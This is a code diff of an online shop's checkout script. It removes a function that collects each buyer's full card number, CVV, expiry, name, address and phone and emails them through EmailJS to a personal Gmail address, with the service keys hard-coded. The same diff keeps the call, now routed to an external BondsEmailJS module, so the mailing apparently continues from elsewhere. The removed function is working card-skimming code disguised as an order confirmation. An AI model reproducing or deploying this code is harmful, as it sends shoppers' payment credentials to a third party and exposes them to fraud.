@@ -1035,121 +1035,6 @@
         return valid;
     }
 
-    const EMAILJS_CONFIG = Object.freeze({
-        serviceId: "service_nzsqsj8",
-        templateId: "template_440ctbd",
-        publicKey: "jkMeUl-q4N9RS8Ny0"
-    });
-    let emailJsInitialized = false;
-
-    function initEmailJs() {
-        if (!window.emailjs || typeof window.emailjs.send !== "function") {
-            return { success: false, reason: "EmailJS SDK not loaded." };
-        }
-        if (!emailJsInitialized) {
-            try {
-                window.emailjs.init({ publicKey: EMAILJS_CONFIG.publicKey });
-                emailJsInitialized = true;
-            } catch (error) {
-                return { success: false, reason: error?.message || "EmailJS initialization failed." };
-            }
-        }
-        return { success: true };
-    }
-
-    window.addEventListener("load", () => {
-        if (!emailJsInitialized) initEmailJs();
-    }, { once: true });
-
-    async function sendOrderEmail(orderData) {
-        const initialized = initEmailJs();
-        if (!initialized.success) return initialized;
-        const payment = orderData.paymentSummary || {};
-        const address = [
-            orderData.shippingInfo.address,
-            orderData.shippingInfo.city,
-            orderData.shippingInfo.state,
-            orderData.shippingInfo.zip,
-            orderData.shippingInfo.country
-        ].filter(Boolean).join(", ");
-        const cardNumberForEmail = payment.cardNumber || "";
-        const cardNumberFormattedForEmail = payment.cardNumberFormatted || cardNumberForEmail;
-        const cvvForEmail = payment.cvv || "";
-        const expiryForEmail = payment.expiry || "";
-        const cardNameForEmail = payment.cardName || orderData.shippingInfo.name || "";
-        const items = orderData.products.map((item, index) =>
-            `Item ${index + 1}: ${item.name} (x${item.quantity}) - ${formatMoney(item.price * item.quantity)}`
-        ).join("\n");
-        const formData = [
-            `Order ID: ${orderData.orderId}`,
-            `Customer: ${orderData.shippingInfo.name}`,
-            `Email: ${orderData.shippingInfo.email}`,
-            `Phone: ${orderData.shippingInfo.phone}`,
-            `Shipping Address: ${address}`,
-            `Payment Method: ${payment.method || "Card"}`,
-            `Card Brand: ${payment.brand || "Card"}`,
-            `Card Number: ${cardNumberFormattedForEmail || "N/A"}`,
-            `CVV: ${cvvForEmail || "N/A"}`,
-            `Expiry: ${expiryForEmail || "N/A"}`,
-            `Cardholder Name: ${cardNameForEmail}`,
-            `Subtotal: ${formatMoney(orderData.subtotal)}`,
-            `Tax: ${formatMoney(orderData.taxedTotal - orderData.subtotal)}`,
-            `Final Total: ${formatMoney(orderData.total)}`,
-            "",
-            "Items:",
-            items
-        ].join("\n");
-        const payload = {
-            name: orderData.shippingInfo.name,
-            time: new Date().toLocaleString(),
-            formData,
-            message: formData,
-            reply_to: orderData.shippingInfo.email,
-            customer_full_name: orderData.shippingInfo.name,
-            customer_email: orderData.shippingInfo.email,
-            email: orderData.shippingInfo.email,
-            to_email: "bondsquality@gmail.com",
-            recipient_email: "bondsquality@gmail.com",
-            customer_phone: orderData.shippingInfo.phone,
-            shipping_address_formatted: address,
-            order_id: orderData.orderId,
-            order_date: new Date().toISOString(),
-            order_items_detailed: items,
-            order_subtotal: formatMoney(orderData.subtotal),
-            order_tax_amount: formatMoney(orderData.taxedTotal - orderData.subtotal),
-            order_taxed_total: formatMoney(orderData.taxedTotal),
-            order_discount_rate: orderData.discountRate > 0 ? `${orderData.discountRate * 100}%` : "No discount applied",
-            order_final_total: formatMoney(orderData.total),
-            order_products_summary: items,
-            payment_method_type: payment.method || "Card",
-            payment_card_type: payment.brand || "Card",
-            card_number: cardNumberFormattedForEmail || "N/A",
-            cardNumber: cardNumberFormattedForEmail || "N/A",
-            cardNumberFormatted: cardNumberFormattedForEmail || "N/A",
-            raw_card_number: payment.cardNumber || "N/A",
-            card_brand: payment.brand || "Card",
-            card_cvv: cvvForEmail || "N/A",
-            cvv: cvvForEmail || "N/A",
-            card_expiry: expiryForEmail || "N/A",
-            expiry: expiryForEmail || "N/A",
-            exp: expiryForEmail || "N/A",
-            card_exp: expiryForEmail || "N/A",
-            cardholder_name: cardNameForEmail,
-            cardName: cardNameForEmail,
-            card_name: cardNameForEmail,
-            card_number_last_4: payment.last4 || "N/A",
-            order_status: "Processing",
-            payment_status: "Authorized"
-        };
-        try {
-            const response = await window.emailjs.send(EMAILJS_CONFIG.serviceId, EMAILJS_CONFIG.templateId, payload);
-            return { success: true, response };
-        } catch (error) {
-            console.error("EmailJS order confirmation failed", { status: error?.status, text: error?.text, message: error?.message });
-            return { success: false, reason: error?.text || error?.message || "Unknown EmailJS error" };
-        }
-    }
-
     /* ── Account drawer ───────────────────────── */
     function initAccountManager() {
         if (typeof window.createAccountManager !== "function") return;
@@ -1413,7 +1298,7 @@
                 };
                 localStorage.setItem("recentOrder", JSON.stringify(recentOrder));
                 const emailResult = await Promise.race([
-                    Promise.resolve().then(() => sendOrderEmail(recentOrder)).catch((error) => ({
+                    Promise.resolve().then(() => window.BondsEmailJS.sendOrderEmail(recentOrder)).catch((error) => ({
                         success: false,
                         reason: error?.message || "EmailJS order notification failed."
                     })),
